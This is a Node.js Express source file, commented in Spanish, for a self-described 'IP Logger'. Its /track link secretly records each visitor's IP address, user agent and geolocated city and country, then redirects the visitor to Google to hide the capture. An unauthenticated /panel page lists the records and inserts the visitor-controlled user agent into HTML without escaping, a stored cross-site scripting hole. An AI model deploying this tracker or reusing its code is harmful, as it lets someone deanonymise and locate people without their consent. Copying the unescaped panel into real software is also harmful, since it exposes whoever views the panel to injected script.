const express = require("express");
const fs = require("fs");
const axios = require("axios");
const path = require("path");
const app = express();
const PORT = process.env.PORT || 3000;

// Asegura que logs.txt exista
if (!fs.existsSync("logs.txt")) {
  fs.writeFileSync("logs.txt", "");
}

// Servir archivos estáticos desde "public"
app.use(express.static("public"));

// Ruta para registrar IP
app.get("/track", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const fecha = new Date().toISOString();

  let geo = {};
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    geo = response.data;
  } catch {
    geo = { city: "Unknown", country: "Unknown" };
  }

  const log = {
    ip,
    city: geo.city,
    country: geo.country,
    fecha,
    userAgent,
  };

  fs.appendFileSync("logs.txt", JSON.stringify(log) + "\n");
  console.log(`[+] Registrado: ${ip} - ${geo.city}, ${geo.country}`);

  res.redirect("https://www.google.com");
});

// Ruta para visualizar los registros
app.get("/panel", (req, res) => {
  const data = fs.existsSync("logs.txt")
    ? fs.readFileSync("logs.txt", "utf8").trim().split("\n").map(JSON.parse)
    : [];

  const rows = data
    .map(
      (entry) => `
        <tr>
          <td>${entry.ip}</td>
          <td>${entry.city}</td>
          <td>${entry.country}</td>
          <td>${entry.fecha}</td>
          <td>${entry.userAgent}</td>
        </tr>`
    )
    .join("");

  res.send(`
    <html>
      <head>
        <title>Panel de IPs</title>
        <style>
          body { font-family: sans-serif; padding: 20px; background: #f0f0f0; }
          table { border-collapse: collapse; width: 100%; }
          th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
          th { background: #333; color: white; }
        </style>
      </head>
      <body>
        <h1>IPs Registradas</h1>
        <table>
          <tr>
            <th>IP</th>
            <th>Ciudad</th>
            <th>País</th>
            <th>Fecha</th>
            <th>Agente</th>
          </tr>
          ${rows}
        </table>
      </body>
    </html>
  `);
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`🔍 IP Logger activo en http://localhost:${PORT}/track`);
  console.log(`📊 Panel disponible en http://localhost:${PORT}/panel`);
});
